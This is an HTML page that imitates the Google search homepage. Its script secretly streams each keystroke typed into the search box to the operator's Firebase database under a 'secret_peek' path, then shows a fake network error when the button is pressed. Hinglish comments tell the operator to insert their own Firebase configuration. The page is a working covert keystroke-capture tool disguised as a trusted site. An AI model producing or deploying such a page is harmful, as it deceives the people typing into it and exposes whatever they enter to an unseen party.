<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { font-family: arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 80vh; margin: 0; background: white; }
        .logo { font-size: 70px; font-weight: bold; margin-bottom: 20px; }
        .g { color: #4285F4; } .o1 { color: #EA4335; } .o2 { color: #FBBC05; } .g2 { color: #4285F4; } .l { color: #34A853; } .e { color: #EA4335; }
        .search-container { width: 90%; max-width: 500px; position: relative; }
        input[type="text"] { width: 100%; padding: 12px 20px; border: 1px solid #dfe1e5; border-radius: 24px; font-size: 16px; outline: none; box-shadow: 0 1px 6px rgba(32,33,36,0.28); }
        .btn { margin-top: 20px; padding: 10px 20px; background: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; color: #3c4043; font-size: 14px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="logo">
        <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
    </div>

    <div class="search-container">
        <input type="text" id="searchInput" placeholder="Search Google or type a URL" autocomplete="off">
    </div>
    
    <button class="btn" onclick="sendToMagicPad()">Google Search</button>

    <script>
        // FIXME: Apne Firebase project ka real configuration yahan paste karein
        const firebaseConfig = {
            apiKey: "AIzaSy...",
            databaseURL: "https://apka-project-default-rtdb.firebaseio.com/",
            projectId: "apka-project-id",
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Jaise hi user type karega, real-time me data aapke pad me jayega
        document.getElementById('searchInput').addEventListener('input', function(e) {
            database.ref('secret_peek/').set({
                text: e.target.value
            });
        });

        function sendToMagicPad() {
            alert("Network error. Please try again later.");
        }
    </script>
</body>
</html>
